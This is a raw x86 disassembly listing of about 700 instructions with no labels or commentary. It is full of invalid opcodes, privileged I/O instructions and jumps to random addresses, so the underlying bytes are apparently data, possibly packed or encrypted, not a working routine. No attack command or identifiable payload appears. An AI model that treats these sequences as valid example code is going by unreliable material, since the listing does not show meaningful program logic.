  402fed:	stos   BYTE PTR es:[edi],al
  402fee:	aam    0xf7
  402ff0:	je     0x402f8a
  402ff2:	pop    ecx
  402ff3:	pop    ebx
  402ff4:	cmp    ebp,DWORD PTR [ecx-0x593382e9]
  402ffa:	or     cl,BYTE PTR [edi-0x35a646b8]
  403000:	outs   dx,BYTE PTR ds:[esi]
  403001:	push   edi
  403002:	push   esp
  403003:	sbb    BYTE PTR [edx-0x13],dh
  403006:	inc    di
  403008:	jmp    0x403082
  40300a:	sar    ecx,cl
  40300c:	mov    ecx,ebx
  40300e:	push   ecx
  40300f:	(bad)  
  403010:	cli    
  403011:	aam    0x8b
  403013:	or     ebp,DWORD PTR [esi+ecx*4+0x716f985]
  40301a:	rcr    cl,1
  40301c:	jmp    0xed150c20
  403021:	mov    ds:0x7197abb9,eax
  403026:	in     al,dx
  403027:	push   ss
  403028:	pushf  
  403029:	dec    esp
  40302a:	pusha  
  40302b:	push   0xffffffcf
  40302d:	aad    0x43
  40302f:	lods   al,BYTE PTR ds:[esi]
  403030:	mov    cl,0xa
  403032:	mov    dh,0x20
  403034:	outs   dx,BYTE PTR ds:[esi]
  403035:	rol    ah,cl
  403037:	push   ebx
  403038:	mov    ah,0x62
  40303a:	xchg   esp,eax
  40303b:	scas   al,BYTE PTR es:[edi]
  40303c:	xchg   BYTE PTR [edi+0x6d],dl
  40303f:	daa    
  403040:	or     DWORD PTR ds:0xfb438d05,ebx
  403046:	push   ebx
  403047:	dec    edx
  403048:	push   ecx
  403049:	inc    ecx
  40304a:	inc    esi
  40304b:	bound  esp,QWORD PTR [ebp+0xf]
  40304e:	xchg   edi,eax
  40304f:	shl    DWORD PTR [edx],cl
  403051:	inc    eax
  403052:	fidiv  DWORD PTR [eax]
  403054:	add    al,BYTE PTR [edi-0x45de378a]
  40305a:	je     0x40309e
  40305c:	je     0x403006
  40305e:	mov    al,ds:0x2e335c16
  403063:	adc    eax,0xf934f875
  403068:	or     ebp,edi
  40306a:	fist   DWORD PTR [esi-0x2872cf9c]
  403070:	add    ecx,0x5f
  403073:	mov    ch,0xe1
  403075:	ja     0x40301e
  403077:	jb     0x4030bd
  403079:	pop    eax
  40307a:	ret    0x869e
  40307d:	jge    0x4030d7
  40307f:	rol    DWORD PTR ds:0x1d00f38e,1
  403085:	sub    al,0xcc
  403087:	dec    ebp
  403088:	dec    edx
  403089:	arpl   WORD PTR [ebx+eiz*8],ax
  40308c:	(bad)  [ebp*8+0xc084834]
  403093:	out    dx,al
  403094:	mov    ah,0x1
  403096:	daa    
  403097:	stc    
  403098:	sub    esi,DWORD PTR [eax+0x289c093d]
  40309e:	test   al,0xb7
  4030a0:	jne    0x40310f
  4030a2:	mov    ah,0x62
  4030a4:	push   esi
  4030a5:	and    DWORD PTR [ecx],ebx
  4030a7:	mov    eax,0x68de6293
  4030ac:	and    BYTE PTR [esi],bh
  4030ae:	fsubr  QWORD PTR [ebx+0x47]
  4030b1:	cdq    
  4030b2:	mov    esi,0xbfc5b78a
  4030b7:	inc    ecx
  4030b8:	xor    ebx,ebx
  4030ba:	inc    ebp
  4030bb:	aaa    
  4030bc:	or     ecx,DWORD PTR [edi-0x35]
  4030bf:	gs lock fwait
  4030c2:	push   esi
  4030c3:	cmp    bl,ch
  4030c5:	icebp  
  4030c6:	(bad)  
  4030c7:	popf   
  4030c8:	imul   ebp,DWORD PTR [esi+0x5bc74a8d],0x7d
  4030cf:	js     0x4030d4
  4030d1:	leave  
  4030d2:	inc    ecx
  4030d3:	jmp    0x28511053
  4030d8:	test   BYTE PTR [edi+eax*8-0x76],cl
  4030dc:	sub    DWORD PTR [edx],eax
  4030de:	leave  
  4030df:	iret   
  4030e0:	shr    BYTE PTR [esi+0x31c1a273],0xf3
  4030e7:	dec    esi
  4030e8:	in     al,0x46
  4030ea:	jmp    0x4030eb
  4030ec:	mov    ch,0xa9
  4030ee:	jge    0x4030a3
  4030f0:	sbb    DWORD PTR [ebx-0x2c],edi
  4030f3:	mov    BYTE PTR [eax+0x418b7219],ah
  4030f9:	inc    ecx
  4030fa:	xor    eax,0xb3e50f0
  4030ff:	xchg   esi,eax
  403100:	push   eax
  403101:	inc    ebp
  403102:	sbb    al,0x8d
  403104:	mov    ah,0x9b
  403106:	aad    0x3c
  403108:	cdq    
  403109:	sar    DWORD PTR [esi+0x57cfac36],1
  40310f:	gs ret 
  403111:	ds cmp ebx,esi
  403114:	aam    0xae
  403116:	xor    eax,0xda1b4ab6
  40311b:	or     BYTE PTR [edx-0x3cd7fb4b],al
  403121:	add    eax,0x7e3e86a5
  403126:	cwde   
  403127:	pop    eax
  403128:	mov    al,0xa7
  40312a:	ins    BYTE PTR es:[edi],dx
  40312b:	xchg   esi,eax
  40312c:	cs in  al,dx
  40312e:	pop    ds
  40312f:	fbld   TBYTE PTR ds:0x3f21723e
  403135:	fnstcw WORD PTR [edx-0x33]
  403138:	shr    BYTE PTR [ecx+0x7b],cl
  40313b:	cdq    
  40313c:	cmp    al,ah
  40313e:	mov    ds:0x6e507cf8,al
  403143:	sbb    DWORD PTR [ecx-0x1b],ecx
  403146:	dec    ebx
  403147:	push   ebx
  403148:	cdq    
  403149:	rcr    bl,cl
  40314b:	cmp    ah,ch
  40314d:	push   0x69ebb0bd
  403152:	lods   eax,DWORD PTR ds:[esi]
  403153:	push   ds
  403154:	push   cs
  403155:	scas   al,BYTE PTR es:[edi]
  403156:	arpl   WORD PTR [eax+0x38fb3cfb],dx
  40315c:	cmovae ebx,ecx
  40315f:	test   ebx,esp
  403161:	and    al,0xd9
  403163:	mov    cl,0x60
  403165:	out    dx,eax
  403166:	add    eax,0xa3193b45
  40316b:	cli    
  40316c:	daa    
  40316d:	das    
  40316e:	push   edx
  40316f:	cli    
  403170:	add    eax,0x50892120
  403175:	adc    eax,0x7325d636
  40317a:	cmp    bl,BYTE PTR [edi-0x3b]
  40317d:	adc    esp,DWORD PTR [ebp+eax*4-0x35f9f656]
  403184:	pop    ss
  403185:	jae    0x40318a
  403187:	cmp    BYTE PTR [eax-0x4c03f753],al
  40318d:	gs test eax,0x517be9ce
  403193:	adc    eax,0xf830769
  403198:	sub    DWORD PTR [ecx-0xb],ecx
  40319b:	adc    eax,0xdd81b145
  4031a0:	push   edi
  4031a1:	inc    eax
  4031a2:	sub    bh,bl
  4031a4:	xor    eax,0xfbde32e2
  4031a9:	test   eax,0xc68f293e
  4031ae:	xor    DWORD PTR [eax],ebp
  4031b0:	cmc    
  4031b1:	jno    0x4031ca
  4031b3:	aaa    
  4031b4:	sar    ch,cl
  4031b6:	adc    al,0xe5
  4031b8:	adc    bh,BYTE PTR [esi-0x25]
  4031bb:	sti    
  4031bc:	dec    ecx
  4031bd:	dec    edx
  4031be:	sub    DWORD PTR [esi-0x67],0x8db18202
  4031c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031c6:	push   edx
  4031c7:	inc    eax
  4031c8:	shl    BYTE PTR [eax+0xe34e7b4],0xe3
  4031cf:	(bad)  
  4031d0:	icebp  
  4031d1:	sub    ebp,DWORD PTR [esi-0x42]
  4031d4:	shr    esp,0x7a
  4031d7:	ss leave 
  4031d9:	in     al,0x91
  4031db:	fs xchg edx,eax
  4031dd:	mov    WORD PTR [edx+0x7c],fs
  4031e0:	xchg   edi,eax
  4031e1:	xchg   ebp,eax
  4031e2:	sbb    ah,dl
  4031e4:	push   DWORD PTR [edx-0x4a60cb44]
  4031ea:	xor    al,0x9a
  4031ec:	sub    edx,ebx
  4031ee:	add    DWORD PTR [ebx-0x72],0xb9110650
  4031f5:	pop    edx
  4031f6:	in     eax,dx
  4031f7:	pop    esp
  4031f8:	mov    ebp,0xeae65c55
  4031fd:	test   ah,dh
  4031ff:	cmp    al,0xe8
  403201:	jne    0x40323d
  403203:	outs   dx,DWORD PTR ds:[esi]
  403204:	inc    eax
  403205:	stos   BYTE PTR es:[edi],al
  403206:	cmc    
  403207:	pop    eax
  403208:	xchg   BYTE PTR [edi+0x63],ch
  40320b:	scas   al,BYTE PTR es:[edi]
  40320c:	fldenv [edx+0x67]
  40320f:	ins    DWORD PTR es:[edi],dx
  403210:	mov    esp,0x8c875d72
  403215:	adc    DWORD PTR [edx+0x374da28],ebx
  40321b:	jno    0x4031db
  40321d:	mov    bl,BYTE PTR [ebp+0x15394e30]
  403223:	sub    al,0x44
  403225:	and    eax,0xb8b749d4
  40322a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40322b:	or     DWORD PTR [edx-0x2b],edi
  40322e:	lods   eax,DWORD PTR ds:[esi]
  40322f:	adc    BYTE PTR [edx-0x48],cl
  403232:	jge    0x4031f4
  403234:	jmp    0xf9cf9dcb
  403239:	jo     0x4031be
  40323b:	mov    eax,0x6d29b902
  403240:	mov    ch,0xf5
  403242:	mov    ch,0xa7
  403244:	jno    0x403204
  403246:	inc    ecx
  403247:	and    eax,0x47c01968
  40324c:	inc    esi
  40324d:	rcr    DWORD PTR [edi],1
  40324f:	pop    eax
  403250:	add    ch,BYTE PTR ds:[ebp+ebx*8+0x761dda17]
  403258:	enter  0xfb7e,0x72
  40325c:	cmp    al,0xf1
  40325e:	cmp    dh,BYTE PTR [ebx-0x7f]
  403261:	push   cs
  403262:	scas   eax,DWORD PTR es:[edi]
  403263:	daa    
  403264:	out    dx,eax
  403265:	sbb    ebp,DWORD PTR [esi+edi*1+0x35589e97]
  40326c:	stos   DWORD PTR es:[edi],eax
  40326d:	(bad)  
  40326e:	sub    ah,dl
  403270:	xchg   edx,eax
  403271:	fist   WORD PTR [eax]
  403273:	loopne 0x4032e2
  403275:	inc    esi
  403276:	repnz add BYTE PTR [edx-0x64],ah
  40327a:	pop    eax
  40327b:	pop    ecx
  40327c:	int3   
  40327d:	jne    0x403288
  40327f:	mov    cl,BYTE PTR [eax+0x7d7c4517]
  403285:	neg    DWORD PTR [edx+0x2ddc2769]
  40328b:	inc    esp
  40328c:	or     BYTE PTR [ecx],dh
  40328e:	inc    edx
  40328f:	inc    ebp
  403290:	sub    BYTE PTR [edi],dl
  403292:	add    eax,0xc351b092
  403297:	in     eax,dx
  403298:	lds    ecx,FWORD PTR [ecx]
  40329a:	aas    
  40329b:	sbb    eax,0x4b321863
  4032a0:	shl    edx,cl
  4032a2:	mul    DWORD PTR [eax+0x4c]
  4032a5:	popa   
  4032a6:	int    0x90
  4032a8:	in     al,0xaa
  4032aa:	gs arpl di,si
  4032ad:	int3   
  4032ae:	inc    ebx
  4032af:	inc    eax
  4032b0:	in     al,dx
  4032b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032b2:	push   esp
  4032b3:	ret    
  4032b4:	jno    0x40327b
  4032b6:	mov    bh,0x41
  4032b8:	daa    
  4032b9:	mov    ds:0xfef13513,eax
  4032be:	jns    0x403266
  4032c0:	mov    bh,0x78
  4032c2:	fwait
  4032c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032c4:	xchg   BYTE PTR [ebp+0x44dd3f70],bl
  4032ca:	mov    ebx,0x7eef0304
  4032cf:	cdq    
  4032d0:	or     DWORD PTR [edi+0x7d],0x9
  4032d4:	shr    ecx,0xd6
  4032d7:	mov    BYTE PTR [eax+ecx*1-0x21],al
  4032db:	jo     0x4032e4
  4032dd:	daa    
  4032de:	sbb    edx,esp
  4032e0:	mov    al,ds:0x36beb325
  4032e5:	into   
  4032e6:	shr    DWORD PTR [ebp+0x2],0x40
  4032ea:	mov    edx,0xe1150690
  4032ef:	popa   
  4032f0:	faddp  st(1),st
  4032f2:	out    0xc7,al
  4032f4:	add    dh,dl
  4032f6:	push   ss
  4032f7:	fist   WORD PTR [ecx+0x295e91c9]
  4032fd:	mov    esp,0xd578c201
  403302:	(bad)  
  403303:	push   edi
  403304:	inc    ebp
  403305:	icebp  
  403306:	sbb    bh,bl
  403308:	inc    edi
  403309:	adc    cl,BYTE PTR [esi+0x6e]
  40330c:	mov    ch,0xea
  40330e:	lods   eax,DWORD PTR ds:[esi]
  40330f:	mov    edx,0x5ab67d18
  403314:	int3   
  403315:	fcomp  DWORD PTR [edx-0x32b85ce]
  40331b:	(bad)  
  40331d:	(bad)  
  40331e:	jno    0x403328
  403320:	push   eax
  403321:	call   0x8e51a829
  403326:	in     al,dx
  403327:	imul   ebx,ebx,0xffffff8d
  40332a:	imul   esi,DWORD PTR [eax+edi*4-0x796ba259],0x1b
  403332:	cs cmc 
  403334:	pushf  
  403335:	inc    ecx
  403336:	ret    
  403337:	fisttp WORD PTR [eax-0x5b475ff6]
  40333d:	aaa    
  40333e:	jecxz  0x403396
  403340:	fst    DWORD PTR [ecx+0x3df30d19]
  403346:	push   eax
  403347:	pop    ds
  403348:	mov    ?,WORD PTR [eax]
  40334a:	call   0x94c6d379
  40334f:	sbb    DWORD PTR [ebx-0x441234fb],esi
  403355:	add    eax,0xb8935bd1
  40335a:	push   ecx
  40335b:	clc    
  40335c:	jg     0x40332b
  40335e:	jb     0x40330c
  403360:	leave  
  403361:	(bad)  
  403362:	mov    eax,0x4795b92c
  403367:	scas   al,BYTE PTR es:[edi]
  403368:	in     eax,dx
  403369:	cmp    al,0xa1
  40336b:	xor    BYTE PTR [edx+0x14f5d0b3],ch
  403371:	stos   BYTE PTR es:[edi],al
  403372:	popa   
  403373:	push   ebp
  403374:	push   0x3a
  403376:	leave  
  403377:	push   cs
  403378:	mov    ecx,0x2ac78dd6
  40337d:	cmp    ch,BYTE PTR [edx+0x5]
  403380:	inc    esp
  403381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403382:	dec    eax
  403383:	bound  esp,QWORD PTR [eax+0x2296b1c0]
  403389:	pop    eax
  40338a:	test   DWORD PTR [edx-0x1c5db20c],ebx
  403390:	es inc ebx
  403392:	jbe    0x4033a8
  403394:	add    al,0x87
  403396:	mov    ah,0xb9
  403398:	adc    BYTE PTR ds:0xbb922f93,ch
  40339e:	push   edx
  40339f:	add    al,0x55
  4033a1:	mov    eax,ds:0x837b7266
  4033a6:	nop
  4033a7:	mov    esi,0x9ee14467
  4033ac:	fs mov cl,0x81
  4033af:	cmp    eax,0x1663cdf7
  4033b4:	mov    WORD PTR cs:[edi-0x702e79f9],?
  4033bb:	xor    dh,BYTE PTR ds:0xeee586ab
  4033c1:	mov    ah,0x2e
  4033c3:	pop    esp
  4033c4:	push   esp
  4033c5:	cmp    edx,eax
  4033c7:	or     al,BYTE PTR [esi]
  4033c9:	pushw  es
  4033cb:	adc    edi,DWORD PTR [edi-0x3418c43f]
  4033d1:	scas   al,BYTE PTR es:[edi]
  4033d2:	push   ebx
  4033d3:	mov    ebp,0x781f9e4b
  4033d8:	iret   
  4033d9:	iret   
  4033da:	push   ss
  4033db:	fist   DWORD PTR [ebp+0x62c47421]
  4033e1:	pop    esi
  4033e2:	and    DWORD PTR [ebx+0x4e],eax
  4033e5:	add    DWORD PTR [edx],ecx
  4033e7:	pop    es
  4033e8:	xchg   edx,eax
  4033e9:	pop    es
  4033ea:	dec    ebp
  4033eb:	sub    dl,BYTE PTR [edx-0x3b530c0b]
  4033f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033f2:	adc    dh,BYTE PTR [edi]
  4033f4:	cmc    
  4033f5:	or     cl,cl
  4033f7:	leave  
  4033f8:	and    dl,BYTE PTR [edi-0x4b4db5bb]
  4033fe:	mov    eax,eax
  403400:	jl     0x4033f4
  403402:	jne    0x403458
  403404:	mov    edx,0xa6d39f1
  403409:	pusha  
  40340a:	or     edi,DWORD PTR [ebx-0x46]
  40340d:	shl    DWORD PTR [eax],1
  40340f:	in     eax,dx
  403410:	inc    esi
  403411:	push   edx
  403412:	sub    BYTE PTR [edx+eiz*8-0x4c2a456f],cl
  403419:	mov    ds:0x5f2cc5a2,al
  40341e:	mov    edi,0x27bee99d
  403423:	mov    ah,BYTE PTR [edi+0x1cd22d3e]
  403429:	call   0xc466:0xe37f06bc
  403430:	pop    ebp
  403431:	repnz clc 
  403433:	or     DWORD PTR [ebx-0x73],edi
  403436:	lods   eax,DWORD PTR ds:[esi]
  403437:	ret    
  403438:	xor    ecx,ebp
  40343a:	test   DWORD PTR [edx-0x54],eax
  40343d:	inc    edi
  40343e:	pop    es
  40343f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403440:	loope  0x4033f6
  403442:	cmc    
  403443:	enter  0x5a8b,0xe1
  403447:	dec    ecx
  403448:	jle    0x403444
  40344a:	sbb    BYTE PTR [edi-0x11acb5f7],al
  403450:	xor    BYTE PTR [edx+ecx*4],cl
  403453:	inc    ebx
  403454:	mov    dl,0xa5
  403456:	outs   dx,BYTE PTR ds:[esi]
  403457:	ins    BYTE PTR es:[edi],dx
  403458:	mov    ebp,0x4bdd30f2
  40345d:	dec    eax
  40345e:	add    ebp,DWORD PTR [edi-0x64]
  403461:	xchg   ecx,eax
  403462:	outs   dx,BYTE PTR ds:[esi]
  403463:	sub    eax,0x681ac70b
  403468:	and    eax,0x412e4ad7
  40346d:	rol    BYTE PTR [esi],1
  40346f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403470:	lock pop ds
  403472:	add    al,0xe6
  403474:	(bad)  
  403476:	in     eax,0xc1
  403478:	cmp    al,0xce
  40347a:	jp     0x403488
  40347c:	(bad)  
  40347d:	(bad)  
  40347e:	jl     0x4034ed
  403480:	jle    0x403474
  403482:	add    BYTE PTR [ebx+0x1d],dh
  403485:	cwde   
  403486:	jo     0x4034b6
  403488:	test   DWORD PTR [ecx+ebp*4-0x48fbc0eb],esp
  40348f:	add    eax,0x13a649df
  403494:	mov    ebx,0x1ac11e8d
  403499:	dec    ecx
  40349a:	adc    BYTE PTR [ebx-0x79608148],ch
  4034a0:	nop
  4034a1:	shr    BYTE PTR [ebx],1
  4034a3:	out    dx,eax
  4034a4:	rcl    esi,cl
  4034a6:	daa    
  4034a7:	dec    ecx
  4034a8:	repnz scas al,BYTE PTR es:[edi]
  4034aa:	jo     0x403476
  4034ac:	test   BYTE PTR [esi-0x23],cl
  4034af:	jns    0x40349f
  4034b1:	mov    ss,WORD PTR [ebp+0x70]
  4034b4:	pop    ebx
  4034b5:	adc    ebx,0x1f310623
  4034bb:	loop   0x4034df
  4034bd:	jns    0x40345b
  4034bf:	sub    edx,ecx
  4034c1:	mov    ch,BYTE PTR [ebp-0x47]
  4034c4:	push   0xe79f3e0
  4034c9:	adc    eax,0xc97843ff
  4034ce:	lods   eax,DWORD PTR ds:[esi]
  4034cf:	lods   al,BYTE PTR ds:[esi]
  4034d0:	call   0xb87:0xc0a36bb8
  4034d7:	xchg   ecx,eax
  4034d8:	shl    BYTE PTR [edx-0x60],0xd8
  4034dc:	lds    edx,FWORD PTR [esp+ebx*8]
  4034df:	mov    esp,0x4bb15488
  4034e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e5:	lods   eax,DWORD PTR ds:[esi]
  4034e6:	jbe    0x40348f
  4034e8:	cmp    DWORD PTR [edx+0x3d],ecx
  4034eb:	aaa    
  4034ec:	and    ch,bl
  4034ee:	inc    ebx
  4034ef:	(bad)  
  4034f0:	imul   ebx,DWORD PTR [eax+0x296b7209],0xffffff87
  4034f7:	inc    edi
  4034f8:	test   DWORD PTR fs:[edx-0x187940d3],esi
  4034ff:	add    ecx,ebp
  403501:	into   
  403502:	push   ecx
  403503:	dec    ebx
  403504:	data16 fidiv DWORD PTR [esi-0x23f39963]
  40350b:	in     eax,0x53
  40350d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40350e:	pslld  mm0,QWORD PTR [eax-0x59]
  403512:	sub    al,0xb7
  403514:	jns    0x4034b7
  403516:	sahf   
  403517:	inc    edx
  403518:	pop    ds
  403519:	push   0x19
  40351b:	inc    eax
  40351c:	or     ah,bh
  40351e:	arpl   WORD PTR [ebx+0x284cf376],bx
  403524:	mov    ds:0x5d43a709,al
  403529:	jg     0x40356f
  40352b:	fidivr WORD PTR [esi-0x27]
  40352e:	bound  edx,QWORD PTR [ecx-0x59]
  403531:	nop
  403532:	int    0xe8
  403534:	mov    esp,0x827c281b
  403539:	cmp    eax,0x55fc25b1
  40353e:	sub    dh,BYTE PTR cs:[ecx+0x4813bfbe]
  403545:	xchg   ebx,eax
  403546:	sbb    BYTE PTR [esi-0x47],bh
  403549:	js     0x403511
  40354b:	xchg   edi,ecx
  40354d:	fwait
  40354e:	not    ebp
  403550:	ficomp WORD PTR [edi]
  403552:	es pop ds
  403554:	mov    bh,0x77
  403556:	or     esp,ebp
  403558:	adc    DWORD PTR [ebx+0x9],ecx
  40355b:	adc    edx,DWORD PTR ds:[edi+0x51c45897]
  403562:	cvtps2pi mm5,QWORD PTR [eax-0x67b99dc8]
  403569:	push   es
  40356a:	rcl    BYTE PTR [esi+ecx*1],0x89
  40356e:	xchg   edx,eax
  40356f:	adc    al,dl
  403571:	pop    ebp
  403572:	fbstp  TBYTE PTR [ecx]
  403574:	jp     0x4035ad
  403576:	pop    edi
  403577:	mov    ecx,0x76ad0017
  40357c:	ins    DWORD PTR es:[edi],dx
  40357d:	push   edx
  40357e:	sub    edx,DWORD PTR [edx+eax*1+0xc]
  403582:	in     eax,0xbe
  403584:	push   ds
  403585:	adc    BYTE PTR [eax],0x28
  403588:	fwait
  403589:	push   esp
  40358a:	mov    BYTE PTR [esi-0x30dd247],bl
  403590:	les    ebx,FWORD PTR [eax]
  403592:	hlt    
  403593:	imul   edx,DWORD PTR ds:0x22566f4c,0xffffff9c
  40359a:	mov    cl,0x3f
  40359c:	stos   DWORD PTR es:[edi],eax
  40359d:	leave  
  40359e:	xor    al,0xc3
  4035a0:	punpckhwd mm0,QWORD PTR [eax]
  4035a3:	push   eax
  4035a4:	lahf   
  4035a5:	aam    0xf5
  4035a7:	pop    ss
  4035a8:	test   edi,edx
  4035aa:	adc    al,0x42
  4035ac:	addr16 lock ds jmp 0x9a39:0xcd1103c
  4035b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035b7:	mov    ah,BYTE PTR [ecx+0x1b63185]
  4035bd:	(bad)  
  4035be:	leave  
  4035bf:	mov    edi,0xda85bbe1
  4035c4:	rcr    DWORD PTR [ebp-0x5484307e],0xbb
  4035cb:	aas    
  4035cc:	cmovae eax,DWORD PTR [edx-0x5e]
  4035d0:	mov    ebx,0xe1266493
  4035d5:	repnz aad 0xa0
  4035d8:	pop    edx
  4035d9:	int    0xc0
  4035db:	in     al,dx
  4035dc:	rcr    BYTE PTR [esi+0x75],0x3a
  4035e0:	enter  0xa94e,0xe4
  4035e4:	popf   
  4035e5:	ja     0x40365d
  4035e7:	mov    dl,0xc0
  4035e9:	or     BYTE PTR [ebp+0x62],al
  4035ec:	mov    ebp,0x757758cf
  4035f1:	fimul  DWORD PTR [edx+ebx*2+0x13f69263]
  4035f8:	stos   BYTE PTR es:[edi],al
  4035f9:	xchg   esi,eax
  4035fa:	je     0x403652
  4035fc:	fiadd  DWORD PTR [ecx-0x57]
  4035ff:	mov    DWORD PTR [esi+0x21ac513a],edx
  403605:	int    0xc2
  403607:	mov    ?,eax
  403609:	enter  0x39bf,0x31
  40360d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40360e:	sub    BYTE PTR [esi],dl
  403610:	push   esi
  403611:	in     eax,dx
  403612:	sbb    BYTE PTR [edx],bl
  403614:	jae    0x40362a
  403616:	fstp   DWORD PTR [ebx]
  403618:	fs pop es
  40361a:	ret    0xb955
  40361d:	mov    ebp,0xf261a29b
  403622:	jo     0x40366f
  403624:	xor    ebp,ebp
  403626:	jnp    0x403600
  403628:	rcr    BYTE PTR [esi-0x52],cl
  40362b:	shr    BYTE PTR [edi-0x68cde5b6],1
  403631:	mov    al,0x4d
  403633:	in     eax,0xf2
  403635:	add    edi,ebx
  403637:	jnp    0x40369a
  403639:	ds pop ds
  40363b:	xchg   ebp,eax
  40363c:	xor    ebp,DWORD PTR [ecx]
  40363e:	loope  0x403655
  403640:	jae    0x40361f
  403642:	mov    DWORD PTR [ebx-0x296cf423],edi
  403648:	mov    esi,0xda3d1f0f
  40364d:	fistp  DWORD PTR [esi-0x47e0e5e0]
  403653:	sub    al,0x49
  403655:	inc    eax
  403656:	and    ebx,DWORD PTR [eax+0x210827c4]
  40365c:	mov    BYTE PTR [ebx+edx*1],cl
  40365f:	push   ebp
  403660:	xor    edi,DWORD PTR [ebx-0x7a]
  403663:	popf   
  403664:	shl    eax,0xdc
  403667:	pop    ebp
  403668:	dec    eax
  403669:	hlt    
  40366a:	inc    eax
  40366b:	test   eax,0xaf8ef5b9
  403670:	sar    BYTE PTR [ebx+esi*4],0xcd
  403674:	loop   0x4036d9
  403676:	push   esi
  403677:	adc    BYTE PTR [esi+0x24],al
  40367a:	mov    dl,0xc7
  40367c:	cdq    
  40367d:	cwde   
  40367e:	push   ss
  40367f:	je     0x403617
  403681:	(bad)  
  403682:	loopne 0x403621
  403684:	xchg   esi,eax
  403685:	cli    
  403686:	stos   BYTE PTR es:[edi],al
  403687:	sub    al,0x3e
  403689:	xor    dh,BYTE PTR [esp+ecx*1+0x56124abe]
  403690:	call   0x15f47eb
  403695:	popf   
  403696:	stos   DWORD PTR es:[edi],eax
  403697:	jno    0x40365a
  403699:	jnp    0x4036f8
  40369b:	fdiv   DWORD PTR [ebx+0x340f5da3]
  4036a1:	pop    edx
  4036a2:	or     eax,0xd3a50989
  4036a7:	sahf   
  4036a8:	jp     0x4036b8
  4036aa:	and    DWORD PTR [ebx-0x48],ebx
  4036ad:	xchg   ebx,eax
  4036ae:	aad    0xd0
  4036b0:	cmc    
  4036b1:	mov    eax,0x239b3066
  4036b6:	gs jle 0x403718
  4036b9:	mov    ebp,0xf6ff939e
  4036be:	cs popf 
  4036c0:	loopne 0x403646
  4036c2:	pop    ds
  4036c3:	dec    ecx
  4036c4:	nop
  4036c5:	jle    0x40369b
  4036c7:	mov    ds:0xaf830915,al
  4036cc:	mov    BYTE PTR [eax-0x52],dh
  4036cf:	sub    al,BYTE PTR [esi-0x34]
  4036d2:	stos   DWORD PTR es:[edi],eax
  4036d3:	cld    
  4036d4:	xor    ch,BYTE PTR [edi-0x35c8d9a9]
  4036da:	call   0xe0bba21d
  4036df:	dec    ebx
  4036e0:	inc    esi
  4036e1:	int3   
  4036e2:	add    bl,BYTE PTR [ebx+0x3f2703]
  4036e8:	mov    ah,0x24
  4036ea:	pop    esi
  4036eb:	icebp  
  4036ec:	in     al,dx
  4036ed:	xchg   ebp,eax
  4036ee:	xor    bh,BYTE PTR [eax]
  4036f0:	call   0x7829:0xc46219f2
  4036f7:	aam    0xb8
  4036f9:	int3   
  4036fa:	fcmovnu st,st(3)
  4036fc:	(bad)  
  4036fd:	icebp  
  4036fe:	daa    
  4036ff:	xor    eax,0xf18360f6
  403704:	inc    BYTE PTR [edx-0x7a]
  403707:	ds (bad) 
  40370a:	push   esp
  40370b:	add    BYTE PTR [ebp+0x58d33d6b],bl
  403711:	push   es
  403712:	xchg   ebp,eax
  403713:	or     ah,BYTE PTR [esi]
  403715:	sub    al,bl
  403717:	popf   
  403718:	mov    bh,0xa6
  40371a:	popa   
  40371b:	cli    
  40371c:	sbb    eax,0xe7742d83
  403721:	fcomp  QWORD PTR [esi-0x6746f5fa]
  403727:	call   0xe34c:0x63fb837f
  40372e:	cmc    
  40372f:	inc    edx
  403730:	mov    ebx,0x824626e1
  403735:	aaa    
  403736:	addr16 loopne 0x4037ae
  403739:	cmp    eax,0x35a01c62
  40373e:	and    bh,BYTE PTR [ebp+0x62]
  403741:	sar    DWORD PTR [eax+ebp*4],0x2c
  403745:	pushf  
  403746:	adc    ebp,DWORD PTR [edi+0x1f1bb87a]
  40374c:	ins    BYTE PTR es:[edi],dx
  40374d:	aam    0x6b
  40374f:	idiv   DWORD PTR [eax+0x2f77e8dd]
  403755:	jp     0x4036e2
  403757:	mov    ebp,0xd6dda3d1
  40375c:	repnz std 
  40375e:	inc    ebx
  40375f:	push   edx
  403760:	outs   dx,DWORD PTR ds:[esi]
  403761:	cmc    
  403762:	add    BYTE PTR [ebx+0x77],ah
  403765:	stos   BYTE PTR es:[edi],al
  403766:	mov    eax,ds:0xf9dfac08
  40376b:	sbb    DWORD PTR [bp+si],0x82551ab7
  403772:	inc    edx
  403773:	jb     0x4037bc
  403775:	inc    edx
  403776:	add    esi,DWORD PTR [esi-0x5a5e0e86]
  40377c:	add    DWORD PTR [eax+0x35],esp
  40377f:	pop    esp
  403780:	jbe    0x403731
  403782:	mov    ch,0x6a
  403784:	xchg   ecx,eax
  403785:	ja     0x40375a
  403787:	mov    dh,0x26
  403789:	lods   al,BYTE PTR ds:[esi]
  40378a:	clc    
  40378b:	sub    esi,DWORD PTR [eax+0xb]
  40378e:	fs dec eax
  403790:	or     BYTE PTR [ebx-0x58363b],0xac
  403797:	sbb    edi,edi
  403799:	shr    BYTE PTR [ebp+esi*8-0x34ae37a8],cl
  4037a0:	xor    eax,0x466eaf14
  4037a5:	and    edi,ecx
  4037a7:	pop    ds
  4037a8:	imul   esi,ecx,0xffffff8d
  4037ab:	dec    ecx
  4037ac:	addr16 jns 0x403820
  4037af:	sub    DWORD PTR [ebp-0x26],eax
  4037b2:	sub    esi,DWORD PTR [edx+ebx*1+0x5fa2f9cf]
  4037b9:	lock sub edx,DWORD PTR [ecx-0x503caed7]
  4037c0:	and    cl,bl
  4037c2:	(bad)  
  4037c4:	cli    
  4037c5:	enter  0xf0d1,0x77
  4037c9:	or     BYTE PTR [eax],dh
  4037cb:	or     edx,DWORD PTR [eax+0x68]
  4037ce:	xor    edx,DWORD PTR [ebx-0x6a2a7547]
  4037d4:	enter  0x567d,0x38
  4037d8:	jg     0x4037d6
